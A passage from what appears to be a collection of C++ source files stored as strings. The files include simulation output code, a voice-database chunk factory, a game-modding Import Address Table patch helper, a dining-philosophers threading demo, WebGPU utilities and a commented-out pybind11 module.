reports.mTime.timeUncertaintyNs;\n        data.time.frequencyUncertaintyNsPerSec =\n            reports.mTime.frequencyUncertaintyNsPerSec;\n    }\n\n    if (data.time.timeEstimate < GNSS_DEBUG_UNKNOWN_UTC_TIME) {\n        data.time.timeEstimate = GNSS_DEBUG_UNKNOWN_UTC_TIME;\n    }\n    if (data.time.timeUncertaintyNs <= 0 ||\n        data.time.timeUncertaintyNs > (float)GNSS_DEBUG_UNKNOWN_UTC_TIME_UNC) {\n        data.time.timeUncertaintyNs = (float)GNSS_D",
    "#include \"Output.hpp\"\n\n// Output Unit Parameters\nstd::ostream & operator << (std::ostream &s, const Units &u){\n  using std::endl;\n  s << fmtTitle % \"Simulation Units\" << endl;\n  s << fmtHead % \"[Length]\"       << fmtDbl % u.Length   << endl;\n  s << fmtHead % \"[Motility]\"     << fmtDbl % u.Motility << endl;\n  s << fmtHead % \"[Friction]\"     << fmtDbl % u.Friction << endl;\n  s << fmtHead % \"[Energy]\"       << fmtDbl % u.Energy   << endl;\n  s << fmtHead % \"[Force]\"        << fmtDbl % u.Force    << endl;\n  s << fmtHead % \"[Time]\"         << fmtDbl % u.Time     << endl;\n  s << fmtHead % \"[Pressure]\"     << fmtDbl % u.Pressure << endl;\n  s << fmtHead % \"[Density]\"      << fmtDbl % u.Density  << endl;\n  s << \"#\";\n  return s;\n}\n\n// Output MD parameters\nstd::ostream & operator << (std::ostream &s, const MDParams &p){\n  using std::endl;\n  s << fmtTitle % \"MD Parameters\" << endl;\n  s << fmtDataDbl % \"dt\"          % (p.dt) << endl;\n  s << fmtDataDbl % \"Frames\"      % p.frames << endl;\n  s << fmtDataInt % \"GTS\"         % p.gts << endl;\n  s << fmtDataInt % \"Total Steps\" % (p.frames * p.gts) << endl;\n  s << \"#\";\n  return s;\n}\n\nstd::ostream& operator << (std::ostream& s, const Container &c){\n  using std::endl;\n  double ls[MAX_DIM];\n  bool   pbc[MAX_DIM];\n  c.box.length(ls);\n  c.box.isPeriodic(pbc);\n  s << fmtTitle % \"Box Parameters\" << endl;\n  s << fmtHead  % \"Dim\"; s << fmtInt % DIM; s << endl;\n\n  s << fmtHead  % \"Size [Red. Units]\";\n  for(auto d : irange(0, DIM)) s << fmtDbl % (ls[d] / units.Length);\n  s << endl;\n\n  s << fmtHead  % \"Size [Sim. Units]\";\n  for(auto d : irange(0, DIM)) s << fmtDbl % ls[d];\n  s << endl;\n\n  s << fmtHead  % \"PBC\" ;\n  for(auto d : irange(0, DIM)) s << fmtStr % (pbc[d] ? \"YES\" : \"NO\");\n  s << endl;\n\n  s << fmtTitle % \"Link List\" << endl;\n  if(SWITCH[OPT::LINKLIST_ON]){\n    std::vector<int> ns;\n    c.linkList.link->get_ns(ns);\n    s << fmtDataStr % \"Enabled\" % \"YES\"  << endl;;\n    s << fmtDataStr % \"Sorted \" % (SWITCH[OPT::LINKLIST_SORTED] ? \"YES\" : \"NO\") << endl;\n    s << fmtDataInt % \"Number Cells\" % c.linkList.numCells << endl;\n    s << fmtDataInt % \"Number Neighbors\" % c.linkList.numNeighbors << endl;\n    s << fmtSub % \"Ns : \";\n    for(auto d : irange(0, DIM)) s << fmtInt % ns[d];\n  }else{\n    s << fmtDataStr % \"Enabled\" % \"NO\";\n  }\n  return s;\n}\nstd::ostream& operator << (std::ostream& s, const WallParams &p){\n  using std::endl;\n  if(SWITCH[OPT::WALLS_ON]){\n    s << fmtTitle % \"Walls\" << endl;\n    for(auto i : irange(0, p.size())){\n      s << fmtSub % p.names[i] << endl;\n      (p.walls[i])->dump(s);\n    }\n  }\n  s << '#';\n  return s;\n}\n\n\n// Output LJ parameters\n/*std::ostream & operator << (std::ostream &s, const LJParams &p){\n  using std::endl;\n  array2<double> dmy(p.epsilon.Nx(), p.epsilon.Ny());\n  s << fmtTitle % \"Element-wise LJ Params\" << endl;\n\n  for(auto i : irange(0u, dmy.Nx())) for(int j : irange(0u, dmy.Ny())) dmy(i,j) = p.epsilon(i,j)/4.0/6.0;\n  s << fmtSub % \"Epsilon\" << endl;  printArray(s, fmtHead, fmtDbl, dmy);   s << '\\n';\n\n  for(auto i : irange(0u, dmy.Nx())) for(int j : irange(0u, dmy.Ny())) dmy(i,j) = sqrt(p.sigma2(i,j));\n  s << fmtSub % \"Sigma\"   << endl;  printArray(s, fmtHead, fmtDbl, dmy);     s << '\\n';\n\n  for(auto i : irange(0u, dmy.Nx())) for(int j : irange(0u, dmy.Ny())) dmy(i,j) = sqrt(p.rcut2(i,j));\n  s << fmtSub % \"Rcut\"    << endl;  printArray(s, fmtHead, fmtDbl, dmy); s << endl;\n\n  for(auto i : irange(0u, dmy.Nx())) for(int j : irange(0u, dmy.Ny())) dmy(i,j) = sqrt(p.rcut2(i,j)/p.sigma2(i,j));\n  s << fmtSub % \"Rcut/Sigma\"    << endl;  printArray(s, fmtHead, fmtDbl, dmy); s << endl;\n\n  for(auto i : irange(0u, dmy.Nx())) for(int j : irange(0u, dmy.Ny())) dmy(i,j) = p.fcut(i,j);\n  s << fmtSub % \"Fshift\" << endl; printArray(s, fmtHead, fmtDbl, dmy); s << '\\n';\n\n  for(auto i : irange(0u, dmy.Ny())){\n    for(int j : irange(0u, dmy.Ny())){\n      p.elemForce(i,j,p.rcut2(i,j),dmy(i,j));\n      dmy(i,j) *= p.sigma2(i,j);\n    };\n  }\n  s << fmtSub % \"F(Rcut)*Sigma^2\" << endl; printArray(s, fmtHead, fmtDbl, dmy); s << '\\n';\n\n  s << fmtDataDbl % \"Max(Rcut)\" % sqrt(p.RCUT2); s << '\\n';\n  s << fmtDataStr % \"Truncation Scheme\" % (SWITCH[OPT::FORCE_SHIFTED] ? \"Shifted Forces\" : \"Shifted Potential\");\n  return s;\n  }*/\n\n\n// Output Cell Type Parameters\nstd::ostream& operator << (std::ostream& s, const CellParams &p){\n  using std::endl;\n  s << fmtDataInt % \"Number of Elements\" % p.numElems << endl;\n  s << fmtHead    % \"Element Names\";\n  for(auto it = p.mapNames.begin(); it != p.mapNames.end(); it++) s << format(\"%s [%d]  \") % (it->first) % (it->second);\n  s << \"\\n\" << \"#\\n\";\n  s << fmtHead    % \"Unique Element Types\";     printArray(s, fmtInt, p.elemType); s << '\\n';\n  s << fmtDataInt % \"Number of Bonds\"    % p.numBonds << endl;\n  s << fmtDataStr % \"Contact Inhibited\"  % (p.CIL ? \"YES\" : \"NO\") << endl;\n  s << fmtDataStr % \"Dividing\" % (p.DIV ? \"YES\" : \"NO\") << endl;\n  s << fmtDataStr % \"Div. Swelling\" % (p.divisionSwelling ? \"YES\" : \"NO\") << endl;\n  s << fmtDataStr % \"Apoptosis\" % (p",
    "#include \"chunkcreator.h\"\n\n// Chunks\n#include \"chunkarray.h\"\n#include \"dbsinger.h\"\n#include \"dbvoice.h\"\n#include \"emptychunk.h\"\n#include \"dbvarticulation.h\"\n#include \"dbvarticulationphu.h\"\n#include \"dbvarticulationphupart.h\"\n#include \"dbvstationary.h\"\n#include \"dbvstationaryphu.h\"\n#include \"dbvstationaryphupart.h\"\n#include \"dbvvqmorph.h\"\n#include \"dbvvqmorphphu.h\"\n#include \"dbvvqmorphphupart.h\"\n#include \"dbtimbre.h\"\n#include \"dbtimbremodel.h\"\n\n#include \"smsgenerictrack.h\"\n#include \"smsregion.h\"\n#include \"smsframe.h\"\n#include \"soundchunk.h\"\n\n// Items\n#include \"item_directory.h\"\n#include \"item_eprguides.h\"\n#include \"item_groupedphoneme.h\"\n#include \"item_phonemegroup.h\"\n#include \"item_phoneticunit.h\"\n\n#include <QtCore/qdebug.h>\n\nChunkCreator *ChunkCreator::mInstance = nullptr;\nbool BaseChunk::HasLeadingQword = true;\nbool BaseChunk::ArrayLeadingChunkName = false;\nconst int BaseChunk::ItemChunkRole = Qt::UserRole + 1;\nconst int BaseChunk::ItemPropDataRole = Qt::UserRole + 2;\nconst int BaseChunk::ItemOffsetRole = Qt::UserRole + 2;\n\nChunkCreator::ChunkCreator(QObject *parent)\n{\n    if (!FactoryMethods.empty())\n        return;\n\n    AddToFactory<ChunkChunkArray>();\n    AddToFactory<ChunkDBSinger>();\n    AddToFactory<ChunkDBVoice>();\n    AddToFactory<ChunkEmptyChunk>();\n    AddToFactory<ChunkDBVArticulation>();\n    AddToFactory<ChunkDBVArticulationPhU>();\n    AddToFactory<ChunkDBVArticulationPhUPart>();\n    AddToFactory<ChunkDBVStationary>();\n    AddToFactory<ChunkDBVStationaryPhU>();\n    AddToFactory<ChunkDBVStationaryPhUPart>();\n    AddToFactory<ChunkDBVVQMorph>();\n    AddToFactory<ChunkDBVVQMorphPhU>();\n    AddToFactory<ChunkDBVVQMorphPhUPart>();\n    AddToFactory<ChunkDBTimbre>();\n    AddToFactory<ChunkDBTimbreModel>();\n\n    AddToFactory<ChunkSMSGenericTrackChunk>();\n    AddToFactory<ChunkSMSRegionChunk>();\n    AddToFactory<ChunkSMSFrameChunk>();\n    AddToFactory<ChunkSoundChunk>();\n\n    AddToFactory<ItemDirectory>();\n    AddToFactory<ItemEprGuide>();\n    AddToFactory<ItemEprGuidesGroup>();\n    AddToFactory<ItemGroupedPhoneme>();\n    AddToFactory<ItemPhonemeGroup>();\n    AddToFactory<ItemPhoneticUnit>();\n\n    //for(auto i : FactoryMethods.keys())\n    //    qDebug() << i << FactoryMethods[i];\n\n}\n\nChunkCreator *ChunkCreator::Get()\n{\n    if (mInstance == nullptr)\n        mInstance = new ChunkCreator;\n    return mInstance;\n}\n\nBaseChunk *ChunkCreator::ReadFor(QByteArray signature, FILE *file)\n{\n    if(!FactoryMethods.contains(signature))\n        return nullptr;\n    auto ret = FactoryMethods[signature]();\n    ret->Read(file);\n    return ret;\n}\n\ntemplate<typename T>\nvoid ChunkCreator::AddToFactory()\n{\n    FactoryMethods[T::ClassSignature()] = &T::Make;\n}\n",
    "#include \"SKSE/IAT.h\"\n\n#include \"SKSE/Logger.h\"\n\n#define WIN32_LEAN_AND_MEAN\n\n#define NOGDICAPMASKS\n#define NOVIRTUALKEYCODES\n//#define NOWINMESSAGES\n#define NOWINSTYLES\n#define NOSYSMETRICS\n#define NOMENUS\n#define NOICONS\n#define NOKEYSTATES\n#define NOSYSCOMMANDS\n#define NORASTEROPS\n#define NOSHOWWINDOW\n#define OEMRESOURCE\n#define NOATOM\n#define NOCLIPBOARD\n#define NOCOLOR\n//#define NOCTLMGR\n#define NODRAWTEXT\n#define NOGDI\n#define NOKERNEL\n//#define NOUSER\n#define NONLS\n//#define NOMB\n#define NOMEMMGR\n#define NOMETAFILE\n#define NOMINMAX\n//#define NOMSG\n#define NOOPENFILE\n#define NOSCROLL\n#define NOSERVICE\n#define NOSOUND\n#define NOTEXTMETRIC\n#define NOWH\n#define NOWINOFFSETS\n#define NOCOMM\n#define NOKANJI\n#define NOHELP\n#define NOPROFILER\n#define NODEFERWINDOWPOS\n#define NOMCX\n\n#include <Windows.h>\n\nnamespace SKSE\n{\n\tstd::uintptr_t GetIATAddr(std::string_view a_dll, std::string_view a_function)\n\t{\n\t\treturn reinterpret_cast<std::uintptr_t>(GetIATPtr(std::move(a_dll), std::move(a_function)));\n\t}\n\n\tstd::uintptr_t GetIATAddr(void* a_module, std::string_view a_dll, std::string_view a_function)\n\t{\n\t\treturn reinterpret_cast<std::uintptr_t>(GetIATPtr(a_module, std::move(a_dll), std::move(a_function)));\n\t}\n\n\tvoid* GetIATPtr(std::string_view a_dll, std::string_view a_function)\n\t{\n\t\treturn GetIATPtr(REL::Module::get().pointer(), std::move(a_dll), std::move(a_function));\n\t}\n\n\t// https://guidedhacking.com/attachments/pe_imptbl_headers-jpg.2241/\n\tvoid* GetIATPtr(void* a_module, std::string_view a_dll, std::string_view a_function)\n\t{\n\t\tassert(a_module);\n\t\tauto dosHeader = static_cast<::IMAGE_DOS_HEADER*>(a_module);\n\t\tif (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {\n\t\t\tlog::error(\"Invalid DOS header\");\n\t\t\treturn nullptr;\n\t\t}\n\n\t\tauto  ntHeader = stl::adjust_pointer<::IMAGE_NT_HEADERS>(dosHeader, dosHeader->e_lfanew);\n\t\tauto& dataDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n\t\tauto  importDesc = stl::adjust_pointer<::IMAGE_IMPORT_DESCRIPTOR>(dosHeader, dataDir.VirtualAddress);\n\n\t\tfor (auto import = importDesc; import->Characteristics != 0; ++import) {\n\t\t\tauto name = stl::adjust_pointer<const char>(dosHeader, import->Name);\n\t\t\tif (a_dll.size() == strlen(name) &&\n\t\t\t\t_strnicmp(a_dll.data(), name, a_dll.size()) != 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tauto thunk = stl::adjust_pointer<::IMAGE_THUNK_DATA>(dosHeader, import->OriginalFirstThunk);\n\t\t\tfor (std::size_t i = 0; thunk[i].u1.Ordinal; ++i) {\n\t\t\t\tif (IMAGE_SNAP_BY_ORDINAL(thunk[i].u1.Ordinal)) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tauto importByName = stl::adjust_pointer<IMAGE_IMPORT_BY_NAME>(dosHeader, thunk[i].u1.AddressOfData);\n\t\t\t\tif (a_function.size() == strlen(importByName->Name) &&\n\t\t\t\t\t_strnicmp(a_function.data(), importByName->Name, a_function.size()) == 0) {\n\t\t\t\t\treturn stl::adjust_pointer<::IMAGE_THUNK_DATA>(dosHeader, import->FirstThunk) + i;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tlog::warn(\"Failed to find {} ({})\", a_dll, a_function);\n\t\treturn nullptr;\n\t}\n\n\tstd::uintptr_t PatchIAT(std::uintptr_t a_newFunc, std::string_view a_dll, std::string_view a_function)\n\t{\n\t\tstd::uintptr_t origAddr = 0;\n\n\t\tauto oldFunc = GetIATAddr(a_dll, a_function);\n\t\tif (oldFunc) {\n\t\t\torigAddr = *reinterpret_cast<std::uintptr_t*>(oldFunc);\n\t\t\tREL::safe_write(oldFunc, a_newFunc);\n\t\t} else {\n\t\t\tlog::warn(\"Failed to patch {} ({})\", a_dll, a_function);\n\t\t}\n\n\t\treturn origAddr;\n\t}\n}\n",
    "\ufeff// Philosopher's dining problem.cpp : \u6b64\u6587\u4ef6\u5305\u542b \"main\" \u51fd\u6570\u3002\u7a0b\u5e8f\u6267\u884c\u5c06\u5728\u6b64\u5904\u5f00\u59cb\u5e76\u7ed3\u675f\u3002\n//\n//\u4e0d\u8db3\uff1a1.\u53ea\u6709\u5168\u90e8\u54f2\u5b66\u5bb6\u90fd\u5403\u4e00\u904d\u996d\u624d\u80fd\u8fdb\u5165\u4e0b\u6b21\u5faa\u73af\n#include\"philosopher.h\"\n#include <iostream>\n#include <windows.h>\n#include <process.h>\n#include <time.h>\n#include <stdlib.h>\n#include <graphics.h>\n#include <conio.h>\nusing namespace std;\nCRITICAL_SECTION g;\nDWORD WINAPI Threadphilos0(LPVOID lpParam);\nDWORD WINAPI Threadphilos1(LPVOID lpParam);\nDWORD WINAPI Threadphilos2(LPVOID lpParam);\nDWORD WINAPI Threadphilos3(LPVOID lpParam);\nDWORD WINAPI Threadphilos4(LPVOID lpParam);\nint i, j;\nbool b[5];\n//\u521d\u59cb\u5316\u7b77\u5b50\u53ca\u54f2\u5b66\u5bb6\nChopstick chopsticks[5] =\n{ Chopstick(20,280,150,320,0),Chopstick(380,80,380,170,1),\nChopstick(700,300,600,350,2),Chopstick(500,570,600,670,3),Chopstick(260,570,160,670,4) };\nPhilosopher philos[5] =\n{\nPhilosopher(190,190,0, chopsticks[0], chopsticks[1]),\nPhilosopher(580,198,1, chopsticks[1], chopsticks[2]),\nPhilosopher(630,450,2, chopsticks[2], chopsticks[3]),\nPhilosopher(380,640,3, chopsticks[3], chopsticks[4]),\nPhilosopher(130,450,4, chopsticks[4], chopsticks[0])\n};\nvoid draw();//\u521b\u5efa\u80cc\u666f\nint main()\n{\n    draw();\n\t//\u5728\u6784\u9020\u51fd\u6570\u4e2d\u52fe\u753b\u4f1a\u53d1\u751f\u5185\u5b58\u51b2\u7a81\uff0c\u6240\u4ee5\u628a\u52fe\u753b\u653e\u5230\u5916\u9762\u4e86\n\tphilos[0].draw(); philos[1].draw(); philos[2].draw();\n\tphilos[3].draw(); philos[4].draw();\n\tchopsticks[0].draw();chopsticks[1].draw();chopsticks[2].draw();\n\tchopsticks[3].draw();chopsticks[4].draw();\n\tDWORD uID;\n\tHANDLE h[5];\n\twhile (1) {\n\t\t::InitializeCriticalSection(&g);\n\t\th[0] = ::CreateThread(NULL, 0, Threadphilos0, NULL, 0, &uID);\n\t\th[1] = ::CreateThread(NULL, 0, Threadphilos1, NULL, 0, &uID);\n\t\th[2] = ::CreateThread(NULL, 0, Threadphilos2, NULL, 0, &uID);\n\t\th[3] = ::CreateThread(NULL, 0, Threadphilos3, NULL, 0, &uID);\n\t\th[4] = ::CreateThread(NULL, 0, Threadphilos4, NULL, 0, &uID);\n\t\t::WaitForMultipleObjects(5, h, TRUE, INFINITE);\n\t\tCloseHandle(h[0]);\n\t\tCloseHandle(h[1]);\n\t\tCloseHandle(h[2]);\n\t\tCloseHandle(h[3]);\n\t\tCloseHandle(h[4]);\n\t\t::DeleteCriticalSection(&g);\n\t}\n\tsystem(\"pause\");\n    _getch();\t\t\t\t// \u6309\u4efb\u610f\u952e\u7ee7\u7eed\n    closegraph();\t\t\t// \u5173\u95ed\u7ed8\u56fe\u7a97\u53e3\n    return 0;\n}\nvoid draw()\n{\n    initgraph(800, 800);\t// \u521b\u5efa\u7ed8\u56fe\u7a97\u53e3\uff0c\u5927\u5c0f\u4e3a 800*800 \u50cf\u7d20\n    setbkcolor(WHITE); // \u8bbe\u7f6e\u80cc\u666f\u8272\u4e3a\u767d\u8272\n    cleardevice(); // \u7528\u80cc\u666f\u8272\u6e05\u7a7a\u5c4f\u5e55\n    settextstyle(40, 40, DEFAULT_PITCH);//\u8bbe\u7f6e\u5b57\u4f53\n    settextcolor(BLACK);\n    TCHAR s[] = _T(\"\u54f2\u5b66\u5bb6\u5c31\u9910\u95ee\u9898\");\n    outtextxy(120, 25, s);//\u6807\u9898\n    setlinecolor(BROWN);\n    circle(380, 380, 200);\t// \u753b\u5706\uff0c\u5706\u5fc3(380\uff0c380)\uff0c\u534a\u5f84 200\n}\nDWORD WINAPI Threadphilos0(LPVOID)\n{\n\t//::EnterCriticalSection(&g);\n\tphilos[0].think();\n\t//::LeaveCriticalSection(&g);\n\tj = rand() *10;\n\tSleep(j);\n\tdo {\n\t\t::EnterCriticalSection(&g);//\u5224\u65ad\u662f\u5426\u80fd\u5403\u996d\u662f\u4e0d\u80fd\u88ab\u4e2d\u65ad\n\t\tb[0] = philos[0].eat();\n\t\t::LeaveCriticalSection(&g);\n\t\tSleep(100);\n\t} while (!b[0]);\n\t::EnterCriticalSection(&g);\n\tphilos[0].finish();            //\u653e\u7b77\u5b50\u65f6\u4e0d\u80fd\u88ab\u4e2d\u65ad\n\t::LeaveCriticalSection(&g);\n\treturn 0;\n}\nDWORD WINAPI Threadphilos1(LPVOID)\n{\n\n\t//::EnterCriticalSection(&g);\n\tphilos[1].think();\n\t//::LeaveCriticalSection(&g);\n\tj = rand() % 10;\n\tSleep(j);\n\tdo\n\t{\n\t\t::EnterCriticalSection(&g);\n\t\tb[1] = philos[1].eat();\n\t\t::LeaveCriticalSection(&g);\n\t\tSleep(100);\n\t} while (!b[1]);\n\t::EnterCriticalSection(&g);\n\tphilos[1].finish();\n\t::LeaveCriticalSection(&g);\n\treturn 0;\n}\nDWORD WINAPI Threadphilos2(LPVOID)\n{\n\n\t//::EnterCriticalSection(&g);\n\tphilos[2].think();\n\t//::LeaveCriticalSection(&g);\n\tj = rand() % 10;\n\tSleep(j);\n\tdo\n\t{\n\t\t::EnterCriticalSection(&g);\n\t\tb[2] = philos[2].eat();\n\t\t::LeaveCriticalSection(&g);\n\t\tSleep(100);\n\t} while (!b[2]);\n\t::EnterCriticalSection(&g);\n\tphilos[2].finish();\n\t::LeaveCriticalSection(&g);\n\treturn 0;\n}\nDWORD WINAPI Threadphilos3(LPVOID)\n{\n\n\t//::EnterCriticalSection(&g);\n\tphilos[3].think();\n\t//::LeaveCriticalSection(&g);\n\tj = rand() % 10;\n\tSleep(j);\n\tdo\n\t{\n\t\t::EnterCriticalSection(&g);\n\t\tb[3] = philos[3].eat();\n\t\t::LeaveCriticalSection(&g);\n\t\tSleep(100);\n\t} while (!b[3]);\n\t::EnterCriticalSection(&g);\n\tphilos[3].finish();\n\t::LeaveCriticalSection(&g);\n\treturn 0;\n}\nDWORD WINAPI Threadphilos4(LPVOID)\n{\n\n\t//::EnterCriticalSection(&g);\n\tphilos[4].think();\n\t//::LeaveCriticalSection(&g);\n\tj = rand() % 10;\n\tSleep(j);\n\tdo\n\t{\n\t\t::EnterCriticalSection(&g);\n\t\tb[4] = philos[4].eat();\n\t\t::LeaveCriticalSection(&g);\n\t\tSleep(100);\n\t} while (!b[4]);\n\t::EnterCriticalSection(&g);\n\tphilos[4].finish();\n\t::LeaveCriticalSection(&g);\n\treturn 0;\n}\n",
    "#include \"webgpu-utils.h\"\n\n#ifdef __EMSCRIPTEN__\n#  include <emscripten.h>\n#endif // __EMSCRIPTEN__\n\n#include <iostream>\n#include <vector>\n#include <cassert>\n\nWGPUAdapter requestAdapterSync(WGPUInstance instance, WGPURequestAdapterOptions const * options) {\n    // A simple structure holding the local information shared with the\n    // onAdapterRequestEnded callback.\n    struct UserData {\n        WGPUAdapter adapter = nullptr;\n        bool requestEnded = false;\n    };\n    UserData userData;\n\n    // Callback called by wgpuInstanceRequestAdapter when the request returns\n    // This is a C++ lambda function, but could be any function defined in the\n    // global scope. It must be non-capturing (the brackets [] are empty) so\n    // that it behaves like a regular C function pointer, which is what\n    // wgpuInstanceRequestAdapter expects (WebGPU being a C API). The workaround\n    // is to convey what we want to capture through the pUserData pointer,\n    // provided as the last argument of wgpuInstanceRequestAdapter and received\n    // by the callback as its last argument.\n    auto onAdapterRequestEnded = [](WGPURequestAdapterStatus status, WGPUAdapter adapter, char const * message, void * pUserData) {\n        UserData& userData = *reinterpret_cast<UserData*>(pUserData);\n        if (status == WGPURequestAdapterStatus_Success) {\n            userData.adapter = adapter;\n        } else {\n            std::cout << \"Could not get WebGPU adapter: \" << message << std::endl;\n        }\n        userData.requestEnded = true;\n    };\n\n    // Call to the WebGPU request adapter procedure\n    wgpuInstanceRequestAdapter(\n            instance /* equivalent of navigator.gpu */,\n            options,\n            onAdapterRequestEnded,\n            (void*)&userData\n    );\n\n    // We wait until userData.requestEnded gets true\n#ifdef __EMSCRIPTEN__\n    while (!userData.requestEnded) {\n\t\temscripten_sleep(100);\n\t}\n#endif // __EMSCRIPTEN__\n\n    assert(userData.requestEnded);\n\n    return userData.adapter;\n}\n\nvoid inspectAdapter(WGPUAdapter adapter) {\n#ifndef __EMSCRIPTEN__\n    WGPUSupportedLimits supportedLimits = {};\n    supportedLimits.nextInChain = nullptr;\n\n#ifdef WEBGPU_BACKEND_DAWN\n    bool success = wgpuAdapterGetLimits(adapter, &supportedLimits) == WGPUStatus_Success;\n#else\n    bool success = wgpuAdapterGetLimits(adapter, &supportedLimits);\n#endif\n\n    if (success) {\n        std::cout << \"Adapter limits:\" << std::endl;\n        std::cout << \" - maxTextureDimension1D: \" << supportedLimits.limits.maxTextureDimension1D << std::endl;\n        std::cout << \" - maxTextureDimension2D: \" << supportedLimits.limits.maxTextureDimension2D << std::endl;\n        std::cout << \" - maxTextureDimension3D: \" << supportedLimits.limits.maxTextureDimension3D << std::endl;\n        std::cout << \" - maxTextureArrayLayers: \" << supportedLimits.limits.maxTextureArrayLayers << std::endl;\n    }\n#endif // NOT __EMSCRIPTEN__\n    std::vector<WGPUFeatureName> features;\n\n    // Call the function a first time with a null return address, just to get\n    // the entry count.\n    size_t featureCount = wgpuAdapterEnumerateFeatures(adapter, nullptr);\n\n    // Allocate memory (could be a new, or a malloc() if this were a C program)\n    features.resize(featureCount);\n\n    // Call the function a second time, with a non-null return address\n    wgpuAdapterEnumerateFeatures(adapter, features.data());\n\n    std::cout << \"Adapter features:\" << std::endl;\n    std::cout << std::hex; // Write integers as hexadecimal to ease comparison with webgpu.h literals\n    for (auto f : features) {\n        std::cout << \" - 0x\" << f << std::endl;\n    }\n    std::cout << std::dec; // Restore decimal numbers\n    WGPUAdapterProperties properties = {};\n    properties.nextInChain = nullptr;\n    wgpuAdapterGetProperties(adapter, &properties);\n    std::cout << \"Adapter properties:\" << std::endl;\n    std::cout << \" - vendorID: \" << properties.vendorID << std::endl;\n    if (properties.vendorName) {\n        std::cout << \" - vendorName: \" << properties.vendorName << std::endl;\n    }\n    if (properties.architecture) {\n        std::cout << \" - architecture: \" << properties.architecture << std::endl;\n    }\n    std::cout << \" - deviceID: \" << properties.deviceID << std::endl;\n    if (properties.name) {\n        std::cout << \" - name: \" << properties.name << std::endl;\n    }\n    if (properties.driverDescription) {\n        std::cout << \" - driverDescription: \" << properties.driverDescription << std::endl;\n    }\n    std::cout << std::hex;\n    std::cout << \" - adapterType: 0x\" << properties.adapterType << std::endl;\n    std::cout << \" - backendType: 0x\" << properties.backendType << std::endl;\n    std::cout << std::dec; // Restore decimal numbers\n}\n\nWGPUDevice requestDeviceSync(WGPUAdapter adapter, WGPUDeviceDescriptor const * descriptor) {\n    struct UserData {\n        WGPUDevice device = nullptr;\n        bool requestEnded = false;\n    };\n    UserData userData;\n\n    auto onDeviceRequestEnded = [](WGPURequestDeviceStatus stat",
    "///**\n// * MIT License\n// *\n// * Copyright (c) 2021 Jeroen van Straten\n// *\n// * Permission is hereby granted, free of charge, to any person obtaining a copy\n// * of this software and associated documentation files (the \"Software\"), to deal\n// * in the Software without restriction, including without limitation the rights\n// * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// * copies of the Software, and to permit persons to whom the Software is\n// * furnished to do so, subject to the following conditions:\n// *\n// * The above copyright notice and this permission notice shall be included in\n// * all copies or substantial portions of the Software.\n// *\n// * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// * SOFTWARE.\n// */\n//\n///** \\file\n// * PyBind11 module for the project.\n// */\n//\n//#include <pybind11/pybind11.h>\n//#include <pybind11/stl.h>\n//#include \"gerbertools/coord.hpp\"\n//#include \"gerbertools/path.hpp\"\n//#include \"gerbertools/pcb.hpp\"\n//#include \"gerbertools/version.hpp\"\n//\n//#define STRINGIFY(x) #x\n//#define MACRO_STRINGIFY(x) STRINGIFY(x)\n//\n//using namespace gerbertools;\n//\n//class Shape {\n//private:\n//\n//    /**\n//     * Path data.\n//     */\n//    coord::Paths p;\n//\n//    /**\n//     * Resolution, in steps per floating point unit.\n//     */\n//    double resolution;\n//\n//    /**\n//     * Miter limit in float units.\n//     */\n//    double miter_limit;\n//\n//    /**\n//     * Arc tolerance in float units.\n//     */\n//    double arc_tolerance;\n//\n//    size_t get_index(int64_t index) const {\n//        if (index < -(int64_t)p.size() || index >= (int64_t)p.size()) {\n//            throw std::domain_error(\"index \" + std::to_string(index) + \" is out of range, size is \" + std::to_string(p.size()));\n//        }\n//        if (index < 0) {\n//            index += p.size();\n//        }\n//        return (size_t)index;\n//    }\n//\n//    Shape combine(const Shape &rhs, coord::Paths (*op)(const coord::Paths &, const coord::Paths &)) const {\n//        const Shape *rhs_conv = &rhs;\n//        auto rhs2 = Shape(resolution);\n//        if (rhs.resolution != resolution) {\n//            double factor = resolution / rhs.resolution;\n//            for (const auto &path : rhs.p) {\n//                rhs2.p.emplace_back();\n//                for (const auto &pt : path) {\n//                    rhs2.p.back().push_back({\n//                        (coord::CInt)std::round(pt.X * factor),\n//                        (coord::CInt)std::round(pt.Y * factor)\n//                    });\n//                }\n//            }\n//            rhs_conv = &rhs2;\n//        }\n//        auto out = Shape(resolution);\n//        out.p = op(p, rhs_conv->p);\n//        return out;\n//    }\n//\n//    ClipperLib::ClipperOffset get_co() const {\n//        return ClipperLib::ClipperOffset(miter_limit * resolution, arc_tolerance * resolution);\n//    }\n//\n//public:\n//    explicit Shape(\n//        double resolution = 1e10,\n//        double miter_limit = 1.0,\n//        double arc_tolerance = 0.005\n//    ) :\n//        resolution(resolution),\n//        miter_limit(miter_limit),\n//        arc_tolerance(arc_tolerance)\n//    { }\n//\n//    double get_resolution() const {\n//        return resolution;\n//    }\n//\n//    double get_miter_limit() const {\n//        return miter_limit;\n//    }\n//\n//    void set_miter_limit(double x) {\n//        miter_limit = x;\n//    }\n//\n//    double get_arc_tolerance() const {\n//        return arc_tolerance;\n//    }\n//\n//    void set_arc_tolerance(double x) {\n//        arc_tolerance = x;\n//    }\n//\n//    void append(const std::vector<std::tuple<double, double>> &data) {\n//        p.emplace_back();\n//        for (const auto &pt : data) {\n//            p.back().push_back({\n//                (coord::CInt)std::round(std::get<0>(pt) * resolution),\n//                (coord::CInt)std::round(std::get<1>(pt) * resolution)\n//            });\n//        }\n//    }\n//\n//    void append_int(const std::vector<std::tuple<int64_t, int64_t>> &data) {\n//        p.emplace_back();\n//        for (const auto &pt : data) {\n//            p.back().push_back({\n//                